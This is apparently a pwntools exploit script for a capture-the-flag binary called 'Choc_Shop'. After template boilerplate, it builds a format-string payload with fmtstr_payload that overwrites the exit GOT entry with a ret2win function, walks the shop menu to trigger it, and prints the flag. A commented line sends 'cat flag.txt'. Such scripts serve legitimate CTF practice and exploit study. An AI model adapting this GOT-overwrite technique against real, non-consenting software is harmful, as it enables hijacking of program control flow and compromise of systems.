#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template Choc_Shop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'Choc_Shop')

# ./exploit.py DEBUG - context.log_level = 'debug'
# ./exploit.py NOASLR - turn off aslr
host = args.HOST or 'localhost'
port = int(args.PORT or 1338)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    p = connect(host, port)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LCL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# MACROS
def s(a) : return p.send(a)
def sl(a) : return p.sendline(a)
def sa(a,b) : return p.sendafter(a,b)
def sla(a,b) : return p.sendlineafter(a,b)
def rv(a) : return p.recv(a)
def ru(a) : return p.recvuntil(a)
def ra() : return p.recvall()
def rl() : return p.recvline()
def inter() : return p.interactive()
def cls() : return p.close()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
b chocmenu
b chocnum
b ret2win
continue
'''.format(**locals())

# LOGGING
def logg(libc_base, pie_base, heap_base):
    if (libc_base != 0) :
        info(f"LIBC: {hex(libc_base)}")
    elif (pie_base != 0) :
        info(f"PIE: {hex(pie_base)}")
    elif (heap_base != 0) :
        info(f"HEAP: {hex(heap_base)}")

'''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
                        BEGIN EXPLOIT
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
'''
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

p = start()

ret2win = 0x401271
ovr = {exe.got['exit'] : exe.sym['ret2win']}
payload = fmtstr_payload(14,ovr)
sla(b'[2] NO',b'1')
sla(b'[4] BITTER',b'2')
sla(b'WANT',b'10')
sl(payload)
sla(b'[2] NO',b'2')
sla(b'TYPE?',b'WHITEDARKRAWBITTER')

# sl(b"echo '$$'")
# sl(b'cat flag.txt')
ru(b'FLAG: ')
flag = rl().decode()
log.success(f"FLAG: {flag}")

# inter()

